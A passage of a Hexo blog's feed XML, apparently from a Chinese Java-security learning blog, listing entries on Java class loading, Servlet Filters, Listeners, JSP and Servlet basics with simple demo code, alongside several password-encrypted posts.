    </entry>
    
    
    
    <entry>
      <title>密码学</title>
      <link href="/2021/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
      <url>/2021/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1d897e58114589d2d57071e61af6b933ecc5a1d163b160da5e8f44b0345b6dd9"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请联系管理员获取密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>熊猫烧香分析</title>
      <link href="/2021/11/23/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/"/>
      <url>/2021/11/23/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9ab935ae2e67d82e5e6dc53697d6bd975ba31e87c1b8e80ce7db6fca85e3a336">b3c9a99c0ccdca4a7128185684909d47d5a5888311d003d0768b8d00f2853565</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">旅行者，请联系管理员获取密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 病毒分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 病毒分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java类加载机制</title>
      <link href="/2021/11/21/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"/>
      <url>/2021/11/21/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将文件转换成字节码</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">tool</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">fun</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line">        <span class="type">byte</span>[] kk = fun.fileConvertToByteArray(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;src/TestExp.class&quot;</span>));</span><br><span class="line">        System.out.println(Arrays.toString(kk));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fun</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] fileConvertToByteArray(File file) &#123;</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="literal">null</span>;</span><br><span class="line">        ByteArrayOutputStream baos;</span><br><span class="line">        FileInputStream fis;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fis = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            baos = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> ((len = fis.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            data = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">            fis.close();</span><br><span class="line">            baos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫</title>
      <link href="/2021/11/21/python%E7%88%AC%E8%99%AB/"/>
      <url>/2021/11/21/python%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="907fbfed5f9c811435589b30d9ca3cbbb1d944b91fdf443d24f4b9246bc9e4c2">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f7c487d9f0e56cb36849e0410ddb9e8eaf1ad980b89b5686a365214129c178c0f1775a1dd0c0b96704b585e78293817f63f83e76444490393828c8b0d7efc29e8b8b03bbe0796dc4fa019d2d0979ca16df</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">旅行者，请输入密码：</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Python爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端三件套</title>
      <link href="/2021/11/21/%E5%89%8D%E7%AB%AF%E4%B8%89%E4%BB%B6%E5%A5%97/"/>
      <url>/2021/11/21/%E5%89%8D%E7%AB%AF%E4%B8%89%E4%BB%B6%E5%A5%97/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1aef0d531ff66003722d0bc5b87e067fa055fd6b9cbd1b22e762b02d879f36c9">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f77a1899b1f5b4eccb1c43d5e476aa41daf80194f6c07140cbd3f4e13d215f140048afac269ab92699fcc7eddc6d938609321c4c29e7f01fce10489f4cc1ab172992d44be3215b7b603b74d2ec0858efd0bb0f85c7244aa2054891f3e7d6154202e5d0dcaeaa8c3152bf140fa6c45efa4e65e1f8dd35b733910e8fa5f62e8a13f4d47432febfe063c1891986b78e09b1649498bfbbed5320bef52349f74f1875897e9cd271bdc43c311dd200df33a5502c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是感染了</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Filter基础</title>
      <link href="/2021/11/21/Filter/"/>
      <url>/2021/11/21/Filter/</url>
      
        <content type="html"><![CDATA[<h1 id="Filter基础"><a href="#Filter基础" class="headerlink" title="Filter基础"></a>Filter基础</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><code>javax.servlet.Filter</code>是<code>Servlet2.3</code>新增的一个特性,主要用于过滤URL请求，通过Filter我们可以实现URL请求资源权限验证、用户登陆检测等功能。</p><p>Filter是一个接口，实现一个Filter只需要重写<code>init</code>、<code>doFilter</code>、<code>destroy</code>方法即可，其中过滤逻辑都在<code>doFilter</code>方法中实现。</p><p><code>Filter</code>的配置类似于<code>Servlet</code>，由<code>&lt;filter&gt;</code>和<code>&lt;filter-mapping&gt;</code>两组标签组成，如果Servlet版本大于3.0同样可以使用注解的方式配置Filter。</p><p>Filter 的生命周期和 Servlet 一样，如下所示：</p><ul><li><code>init(FilterConfig)</code>：初始化方法，只会在 web 应用程序启动时调用一次。</li><li><code>doFilter(ServletRequest, ServletResponse, FilterChain)</code>：实现过滤功能。当客户请求访问与过滤器关联的 URL 的时候，过滤器将先执行 doFilter 方法。FilterChain 参数用于访问后续过滤器</li><li><code>destory()</code>：销毁 Filter，只会在当 web 应用移除或服务器停止时才调用一次来销毁 Filter 对象</li></ul><p>一个 Servlet 可以注册多个 Filter，Web 容器会将注册的多个 Filter 组合成一个“Filter链”，并按照一定的顺序依次执行各 Filter 的 doFilter() 方法。</p><p><img src="/2021/11/21/Filter/Tomcat-4.png" alt></p><h2 id="基于注解实现的Filter"><a href="#基于注解实现的Filter" class="headerlink" title="基于注解实现的Filter"></a>基于注解实现的Filter</h2><p>简单写个 demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">package com.servlet.study;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Created by dotast on 2022/10/21 10:41</span><br><span class="line"> */</span><br><span class="line">@WebFilter(filterName = &quot;ServletTest&quot;, urlPatterns = &#123;&quot;/*&quot;&#125;)</span><br><span class="line">public class ServletTest implements Filter &#123;</span><br><span class="line"></span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class="line">        String name = servletRequest.getParameter(&quot;name&quot;);</span><br><span class="line">        if(name.equals(&quot;admin&quot;))&#123;</span><br><span class="line">            // 跳转到 amdin.jsp</span><br><span class="line">            RequestDispatcher redirect = servletRequest.getRequestDispatcher(&quot;/admin.jsp&quot;);</span><br><span class="line">            redirect.forward(servletRequest,servletResponse);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            RequestDispatcher redirect = servletRequest.getRequestDispatcher(&quot;/loginerror.jsp&quot;);</span><br><span class="line">            redirect.forward(servletRequest,servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line">        // 使下一个 Filter 能够继续执行</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/21/Filter/image-20221021163302120.png" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Listener基础</title>
      <link href="/2021/11/21/Listener/"/>
      <url>/2021/11/21/Listener/</url>
      
        <content type="html"><![CDATA[<h1 id="Listener基础"><a href="#Listener基础" class="headerlink" title="Listener基础"></a>Listener基础</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Listener 顾名思义就是监听器，本质为实现特定接口的 Java 程序，用于监听方法和属性。当被监听的方法或者属性有所变化时，Listener 会自动执行所设定好的对应操作。</p><p>监听器的分类如下所示：</p><div class="table-container"><table><thead><tr><th style="text-align:left">事件源</th><th style="text-align:left">监听器</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">ServletContext</td><td style="text-align:left">ServletContextListener</td><td style="text-align:left">用于监听 ServletContext 对象的创建与销毁过程</td></tr><tr><td style="text-align:left">HttpSession</td><td style="text-align:left">HttpSessionListener</td><td style="text-align:left">用于监听 HttpSession 对象的创建和销毁过程</td></tr><tr><td style="text-align:left">ServletRequest</td><td style="text-align:left">ServletRequestListener</td><td style="text-align:left">用于监听 ServletRequest 对象的创建和销毁过程</td></tr><tr><td style="text-align:left">ServletContext</td><td style="text-align:left">ServletContextAttributeListener</td><td style="text-align:left">用于监听 ServletContext 对象的属性新增、移除和替换</td></tr><tr><td style="text-align:left">HttpSession</td><td style="text-align:left">HttpSessionAttributeListener</td><td style="text-align:left">用于监听 HttpSession 对象的属性新增、移除和替换</td></tr><tr><td style="text-align:left">ServletRequest</td><td style="text-align:left">ServletRequestAttributeListener</td><td style="text-align:left">用于监听 HttpServletRequest 对象的属性新增、移除和替换</td></tr><tr><td style="text-align:left">HttpSession</td><td style="text-align:left">HttpSessionBindingListener</td><td style="text-align:left">用于监听 JavaBean 对象绑定到 HttpSession 对象和从 HttpSession 对象解绑的事件</td></tr><tr><td style="text-align:left">HttpSession</td><td style="text-align:left">HttpSessionActivationListener</td><td style="text-align:left">用于监听 HttpSession 中对象活化和钝化的过程</td></tr></tbody></table></div><p>较为常用的有<code>ServletContextListener</code>、<code>HttpSessionListener</code>和<code>ServletRequestListener</code>等。</p><h2 id="基于注解实现的Listener"><a href="#基于注解实现的Listener" class="headerlink" title="基于注解实现的Listener"></a>基于注解实现的Listener</h2><p>一个Web服务器可以运行一个或多个WebApp，对于每个WebApp，Web服务器都会为其创建一个全局唯一的<code>ServletContext</code>实例，<code>ServletContext</code>实例最大的作用就是设置和共享全局信息。</p><p>编写一个实现<code>ServletContextListener</code>接口的实现类如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/25 10:35</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerTest</span> <span class="keyword">implements</span> <span class="title class_">ServletContextListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextInitialized</span><span class="params">(ServletContextEvent servletContextEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is initialized!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextDestroyed</span><span class="params">(ServletContextEvent servletContextEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is destroyed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动 Tomcat 服务器，<code>ServletContextListener</code>监听到<code>ServletContext</code>对象被创建，触发<code>contextInitialized()</code>方法。</p><p>关闭 Tomcat 服务器，<code>ServletContextListener</code>监听到<code>ServletContext</code>对象被销毁，触发<code>contextDestroyed</code>方法。<img src="/2021/11/21/Listener/image-20221025104019871.png" alt="image-20221025104019871"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关于<code>Servlet</code>、<code>Filter</code>和<code>Listener</code>的调用顺序可以在<code>org.apache.catalina.core.StandardContext#startInternal()</code>方法中找到答案<img src="/2021/11/21/Listener/image-20221025105514201.png" alt="image-20221025105514201"></p><p>如图所示，调用顺序分别为<code>listenerStart()</code>、<code>filterStart()</code>和<code>loadOnStartup()</code>，三个方法分别调用了<code>Listener</code>、<code>Filter</code>和<code>Servlet</code>，因此可以得到调用顺序为：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Listener --&gt; Filter --&gt; Servlet</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Java基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jsp基础</title>
      <link href="/2021/11/21/Jsp/"/>
      <url>/2021/11/21/Jsp/</url>
      
        <content type="html"><![CDATA[<h1 id="Jsp基础"><a href="#Jsp基础" class="headerlink" title="Jsp基础"></a>Jsp基础</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>JSP 与 PHP、ASP 等脚本语言类似，早期为了简化<code>Servlet</code>的处理流程而诞生，目的是起到快速处理后端的逻辑请求任务。因为 Jsp 可以直接调用 Java 代码的特性，成为了 Webshell 的载体。</p><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><ul><li><code>&lt;%@ page ... %&gt;</code>：定义网页依赖属性，比如脚本语言，error 页面等。</li><li><code>&lt;%@ include ...%&gt;</code>：包含其他文件（静态）</li><li><code>&lt;%@ taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot; %&gt;</code>：引入标签库的定义</li></ul><h2 id="JSP表达式（EL）"><a href="#JSP表达式（EL）" class="headerlink" title="JSP表达式（EL）"></a>JSP表达式（EL）</h2><p>EL表达式( Expression Language )语言,常用于在jsp页面中获取请求中的值，使用EL表达式可以实现命令执行，这里只是简单说一下概念，具体实现等到用时再聊，这里不展开。</p><ul><li>立即求值：<code>$&#123;&#125;</code></li><li>延迟求值：<code>#&#123;&#125;</code></li></ul><h2 id="JSP标准标签库（JSTL）"><a href="#JSP标准标签库（JSTL）" class="headerlink" title="JSP标准标签库（JSTL）"></a>JSP标准标签库（JSTL）</h2><p>JSP标准标签库（JSTL）是一个JSP标签集合，它封装了JSP应用的通用核心功能。</p><p>JSTL支持通用的、结构化的任务，比如迭代，条件判断，XML文档操作，国际化标签，SQL标签。 除了这些，它还提供了一个框架来使用集成JSTL的自定义标签。</p><h2 id="JSP对象"><a href="#JSP对象" class="headerlink" title="JSP对象"></a>JSP对象</h2><p>从本质上说 JSP 就是一个Servlet，JSP 引擎在调用 JSP 对应的 jspServlet 时，会传递或创建 9 个与 web 开发相关的对象供 jspServlet 使用。 JSP 技术的设计者为便于开发人员在编写 JSP 页面时获得这些 web 对象的引用，特意定义了 9 个相应的变量，开发人员在JSP页面中通过这些变量就可以快速获得这 9 大对象的引用。</p><p>如下：</p><div class="table-container"><table><thead><tr><th>变量名</th><th>类型</th><th>作用</th></tr></thead><tbody><tr><td>pageContext</td><td>PageContext</td><td>当前页面共享数据，还可以获取其他8个内置对象</td></tr><tr><td>request</td><td>HttpServletRequest</td><td>客户端请求对象，包含了所有客户端请求信息</td></tr><tr><td>session</td><td>HttpSession</td><td>请求会话</td></tr><tr><td>application</td><td>ServletContext</td><td>全局对象，所有用户间共享数据</td></tr><tr><td>response</td><td>HttpServletResponse</td><td>响应对象，主要用于服务器端设置响应信息</td></tr><tr><td>page</td><td>Object</td><td>当前Servlet对象,<code>this</code></td></tr><tr><td>out</td><td>JspWriter</td><td>输出对象，数据输出到页面上</td></tr><tr><td>config</td><td>ServletConfig</td><td>Servlet的配置对象</td></tr><tr><td>exception</td><td>Throwable</td><td>异常对象</td></tr></tbody></table></div>]]></content>
      
      
      
        <tags>
            
            <tag> Jsp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servlet基础</title>
      <link href="/2021/11/21/Servlet%E5%9F%BA%E7%A1%80/"/>
      <url>/2021/11/21/Servlet%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Servlet基础"><a href="#Servlet基础" class="headerlink" title="Servlet基础"></a>Servlet基础</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><blockquote><p>Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。</p><p>使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。</p><p>狭义的Servlet是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类，一般情况下，人们将Servlet理解为后者。</p></blockquote><p>Java EE 提供了 Servlet API，通过 Servlet，我们可以处理 Web 应用程序的 HTTP 请求以及响应，关系如下：</p><p><img src="/2021/11/21/Servlet%E5%9F%BA%E7%A1%80/servlet-arch.jpeg" alt="servlet-arch"></p><h2 id="Servlet的定义"><a href="#Servlet的定义" class="headerlink" title="Servlet的定义"></a>Servlet的定义</h2><p>定义 Servlet 只需要编写的类继承<code>javax.servlet.http.HttpServlet</code>类并重写<code>doGet()</code>或者<code>doPost()</code>等代表请求方式的方法即可。</p><h3 id="HttpServlet"><a href="#HttpServlet" class="headerlink" title="HttpServlet"></a>HttpServlet</h3><p>先了解一下<code>HttpServlet</code>类，从图中可以看到该类继承于<code>GenericServlet</code>类<br><img src="/2021/11/21/Servlet%E5%9F%BA%E7%A1%80/image-20221021111852316.png" alt="image-20221021111852316"></p><p>而<code>GenericServlet</code>类实现了<code>Servlet</code>、<code>ServletConfig</code>和<code>Serializable</code>接口<br><img src="/2021/11/21/Servlet%E5%9F%BA%E7%A1%80/image-20221021112209736.png" alt="image-20221021112209736"></p><p><code>HttpServlet</code>抽象类中含有<code>doGet/doPost/doDelete/doHead/doPut/doOptions/doTrace</code>等方法用于处理客户端的不同请求方法，因此我们在定义 Servlet 时，要重写该抽象类中的方法用于处理请求。</p><h3 id="基于注解方式配置"><a href="#基于注解方式配置" class="headerlink" title="基于注解方式配置"></a>基于注解方式配置</h3><p>在 Servlet 3.0 之后可以采用注解方式配置 Servlet，在任意类导入<code>javax.servlet.annotation.WebServlet;</code></p><p>在 pom.xml 文件中添加 maven 依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.1.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>编写 ServletTest.class<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/21 10:41</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletTest</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        out.write(<span class="string">&quot;&lt;h1&gt;Hello, dotast!&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>访问<code>/hello</code>接口<br><img src="/2021/11/21/Servlet%E5%9F%BA%E7%A1%80/image-20221021113345710.png" alt="image-20221021113345710"></p><h3 id="基于web-xml文件配置"><a href="#基于web-xml文件配置" class="headerlink" title="基于web.xml文件配置"></a>基于web.xml文件配置</h3><p>编写好 ServletTest 类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/21 10:41</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletTest</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span 